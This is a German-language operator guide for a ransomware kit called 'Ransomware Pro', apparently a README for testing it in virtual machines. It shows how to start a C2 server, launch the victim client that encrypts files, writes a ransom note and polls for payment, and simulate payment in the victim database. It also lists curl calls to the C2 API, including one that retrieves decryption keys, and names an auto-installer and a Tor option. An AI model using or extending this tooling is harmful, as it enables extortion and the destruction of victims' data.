# RANSOMWARE PRO - LOCAL TESTING GUIDE

## 🎯 Setup für VM Testing

Du hostestt:
- **HOST PC (dieser PC):** C2 Server → `192.168.126.200:5000`
- **VICTIM VM:** Ransomware Client

---

## 📋 SCHRITT 1: Requirements installieren

**Auf DIESEM PC:**
```bash
cd D:\ransomware_pro
pip install -r requirements.txt
```

**Auf VICTIM VM:**
```bash
pip install -r requirements.txt
```

---

## 🚀 SCHRITT 2: C2 Server starten (HOST PC)

**Terminal 1 - auf diesem PC:**
```bash
cd D:\ransomware_pro
python setup_test.py server
```

**Ergebnis:**
```
[+] Setting up C2 SERVER environment...
[✓] Database directory: C:\ransomware
[*] Starting C2 SERVER on 0.0.0.0:5000...
 * Running on http://0.0.0.0:5000
```

**Server läuft jetzt auf:**
- `http://192.168.126.200:5000`
- API: `http://192.168.126.200:5000/api/v1`

---

## 💻 SCHRITT 3: Victim Client starten (VICTIM VM)

**Terminal 2 - auf der VM:**
```bash
cd D:\ransomware_pro
python setup_test.py victim --server-ip 192.168.126.200
```

**Ergebnis:**
```
[+] Setting up VICTIM environment...
[+] Target C2 Server: 192.168.126.200:5000
[*] Starting RANSOMWARE VICTIM...
[*] PHASE 1: Scanning for target files...
[+] Infection registered: 200
[+] Ransom note written to Desktop
[*] Starting payment monitoring loop...
```

---

## 🔄 TESTING FLOW

### **Phase 1: Infection (Auto)**
✅ Victim scannt & verschlüsselt Dateien
✅ Registriert sich bei C2
✅ Zeigt Ransom Note
✅ Startet Payment-Überwachung

### **Phase 2: Payment Simulation**

Auf dem **HOST PC**, ein neues Terminal öffnen:

```bash
# Prüfe Victim-Status
curl http://localhost:5000/api/v1/payment/status/VICTIM_ID_HERE

# Markiere Payment als erfolgt (manuell für Testing)
python -c "
import sqlite3
conn = sqlite3.connect('C:\\\\ransomware\\\\victims.db')
cursor = conn.cursor()
cursor.execute(\"UPDATE victims SET payment_received = 1, status = 'PAID'\")
conn.commit()
print('[+] Payment marked as received')
"
```

### **Phase 3: Auto-Decryption**

✅ Victim bemerkt: Payment verifiziert!
✅ Fordert Decryption-Key von C2 an
✅ Entschlüsselt ALLE Dateien automatisch
✅ Fertig!

---

## 📊 API ENDPOINTS (zum Testen)

### **1. Registrierung prüfen**
```bash
curl http://192.168.126.200:5000/api/v1/payment/status/VICTIM_ID
```

### **2. Statistics anschauen**
```bash
curl http://192.168.126.200:5000/api/v1/admin/stats
```

### **3. Decryption-Key abrufen (nach Payment)**
```bash
curl http://192.168.126.200:5000/api/v1/decryption/key/VICTIM_ID
```

---

## 🔐 DATABASE INSPECTION

**Victim-Datenbank ansehen:**
```bash
python -c "
import sqlite3
conn = sqlite3.connect('C:\\\\ransomware\\\\victims.db')
cursor = conn.cursor()
cursor.execute('SELECT * FROM victims')
for row in cursor.fetchall():
    print(row)
"
```

---

## 🧪 TESTSZENARIEN

### **Test 1: Full Encryption & Decryption**
1. Server starten
2. Victim starten (verschlüsselt Dateien)
3. Payment manuell in DB markieren
4. Warten → Dateien sollten automatisch entschlüsselt werden

### **Test 2: Multiple Victims**
1. Server starten
2. Mehrere Victim-VMs starten
3. Auf dem Server: `/api/v1/admin/stats` aufrufen
4. Sollte alle Victims zeigen

### **Test 3: C2 Communication**
1. Server & Victim starten
2. Logs auf BEIDEN Seiten beobachten
3. HTTP-Requests sollten sichtbar sein

---

## 🚨 DEBUGGING

### **Server Logs ansehen:**
```bash
# Terminal where server runs
# Flask zeigt alle HTTP-Requests an
```

### **Victim Logs ansehen:**
```bash
# Terminal where victim runs
# DEBUG_MODE=true zeigt alle Schritte
```

### **Database Connection testen:**
```bash
python -c "
import sqlite3
conn = sqlite3.connect('C:\\\\ransomware\\\\victims.db')
print('[+] Database connected')
cursor = conn.cursor()
cursor.execute('SELECT COUNT(*) FROM victims')
print(f'[+] Total victims: {cursor.fetchone()[0]}')
"
```

---

## 📝 WICHTIGE DATEIEN

```
D:\ransomware_pro\
├── ransomware_core.py    # Victim payload
├── c2_server.py          # C2 Server
├── config.py             # Konfiguration
├── setup_test.py         # Test-Setup (THIS FILE)
├── launcher.py           # Auto-installer
├── cleanup.py            # Cleanup
└── requirements.txt      # Dependencies
```

---

## ⚠️ CLEANUP NACH TESTING

**Auf VICTIM VM - Dateien restaurieren:**
```bash
python cleanup.py
```

**Auf HOST PC - Database löschen:**
```bash
rmdir /s C:\ransomware
```

---

## 💡 TIPPS

- **Netstats überwachen:** `netstat -an | find "5000"` (C2 Port)
- **Firewall:** Sicherstellen, dass Port 5000 offen ist (Windows Firewall)
- **Testing Ordner:** Dummy-Dateien in `~\ransomware_test` erstellen
- **Payment simulieren:** In DB `payment_received = 1` setzen
- **Tor sparen:** USE_TOR=false für lokales Testing

---

**Status:** ✅ Ready for Local VM Testing
**Version:** 2.0
**Last Updated:** December 5, 2025
